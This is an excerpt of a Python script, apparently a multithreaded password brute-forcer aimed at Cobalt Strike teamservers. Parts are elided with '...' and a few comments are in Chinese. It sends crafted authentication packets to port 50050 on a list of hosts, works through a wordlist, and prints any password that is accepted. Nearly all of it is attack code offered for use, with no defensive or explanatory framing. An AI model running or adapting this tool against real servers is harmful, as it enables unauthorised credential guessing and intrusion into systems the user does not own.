...
# ssl.wrap_socket() 利用这个库发ssl请求 https://blog.csdn.net/Wendy019900107/article/details/99183695
...
def passwordcheck(password):
    if len(password) > 0:
        ...
        payload = bytearray(b"\x00\x00\xbe\xef") + len(password).to_bytes(1, "big", signed=True) + bytes(
            bytes(password, "ascii").ljust(256, b"A"))  # ljust() 填充字符串至指定长度，填充任意256字节数据
        conn.send(payload)
        if conn.is_connected(): result = conn.receive()
        if conn.is_connected(): conn.close()
        if result == bytearray(b"\x00\x00\x00\x00"):  # fail
            print('cs error: ' + args.host)
        elif result == bytearray(b"\x00\x00\xca\xfe"):  # success
            return password
        else:
            return False
    else:
...
if __name__ == '__main__':
    ...
    for host in hosts:
        ...
        # args.host = '10.10.40.63'
        args.port = 50050
        args.threads = 25
        args.wordlist = 'pwd.txt'
            ...
            with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
                ...
                for future in concurrent.futures.as_completed(future_to_check):
                    ...
                    try:
                        ...
                        attempts = attempts + 1
                        if data:
                            print("Found Password: {}".format(password) + " host: " + args.host)
